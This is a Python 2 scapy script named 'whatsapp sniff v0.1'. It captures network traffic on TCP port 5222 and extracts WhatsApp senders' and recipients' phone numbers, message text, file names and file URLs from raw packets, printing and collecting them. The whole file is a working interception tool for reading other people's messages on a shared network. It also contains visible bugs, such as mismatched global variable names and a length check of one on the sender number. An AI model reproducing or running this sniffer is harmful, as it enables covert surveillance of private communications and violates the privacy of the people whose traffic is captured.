#!/usr/bin/env python
import os 
import sys 
from scapy.all import *
import re

PreviousMsg = "" 
PreviousFilename = "" 
Files = [] 
Messages = [] 
Urls = []

def banner(): 
    print "#########################"
    print "## whatsapp sniff v0.1 ##"
    print "## qnix@0x80.org ##"
    print "#########################\n"

def whatsapp_parse(packet):
    global Previous_Msg
    global Previous_Filename 
    global Files 
    global Messages 
    global Urls 
    src = packet.sprintf("%IP.src%") 
    dst = packet.sprintf("%IP.dst%") 
    sport = packet.sprintf("%IP.sport%") 
    dport = packet.sprintf("%IP.dport%") 
    raw = packet.sprintf("%Raw.load%")

    # Target Sending stuff
    if dport == "5222":
        Filename = ""
        toNumber = ""
        Url      = ""
        Msg      = ""
        try:
            toNumber = re.sub("\D", "", raw)
            if toNumber[5:16].startswith("0"):
                toNumber = toNumber[6:17]
            else:
                toNumber = toNumber[5:16]
            try:
                Filename = raw.split("file\\xfc")[1][1:37]
                Url =  raw.split("file\\xfc")[1].split("\\xa5\\xfc")[1].split("\\xfd\\x00")[0][1:]
            except:pass

            try:
                Msg = raw.split("\\xf8\\x02\\x16\\xfc")[1][4:-1].decode("string_escape")
            except:
                pass
        except: pass
        if(len(toNumber) >= 10):
            if len(Msg) >= 1 and Previous_Msg != Msg:
                Previous_Msg = Msg
                print "To        :  ", toNumber
                print "Msg       :  ", Msg
                Messages.append(Msg)
            elif(len(Filename) >= 1 and Previous_Filename != Filename):
                Previous_Filename = Filename
                print "To        :  ", toNumber
                print "Filename  :  ", Filename
                print "URL       :  ", Url
                Files.append(Filename)
                Urls.append(Url)

    # Recieved Messages
    if sport == "5222":
        Msg        = ""
        fromNumber = ""
        Url        = ""
        Filename   = ""
        try:
            fromNumber = re.sub("\D", "", raw)
            if(fromNumber[5:16].startswith("0")): fromNumber = fromNumber[6:17]
            else: fromNumber = fromNumber[5:16]
            try:
                Filename   = raw.split("file\\xfc")[1][1:37]
                Url        = raw.split("file\\xfc")[1].split("\\xa5\\xfc")[1].split("\\xfd\\x00")[0][1:]
            except: pass
            try: Msg = raw.split("\\x02\\x16\\xfc")[1][4:-1].decode("string_escape")
            except: pass
        except:
            pass
        if len(fromNumber) == 1 and Previous_Msg != Msg:
                Previous_Msg = Msg
                print "From     : ", fromNumber
                print "Msg      : ", Msg
                Messages.append(Msg)
        elif len(Filename) >= 1 and Previous_Filename != Filename:
                Previous_Filename = Filename
                print "From     : ", fromNumber
                print "Filename : ", Filename
                print "URL      : ", Url
                Files.append(Filename)
                Urls.append(Url)

def callback(packet): 
    sport = packet.sprintf("%IP.sport%")
    dport = packet.sprintf("%IP.dport%")
    raw = packet.sprintf("%Raw.load%")
    if raw != '??':
        if dport == "5222" or sport == "5222":
            whatsapp_parse(packet)

def main(): 
    banner() 
    if len(sys.argv) != 2:
        print "%s " % sys.argv[0]
        sys.exit(1)

    iface = sys.argv[1]
    verb = 0
    promisc = 0
    expr = "tcp port 5222"

    print("[+] Interface : ", iface)
    print("[+] filter    : ", expr)
    sniff(filter=expr, prn=callback, store=0)
    # print "[+] iface %s" % scapy.iface
if __name__ == "__main__":
    main()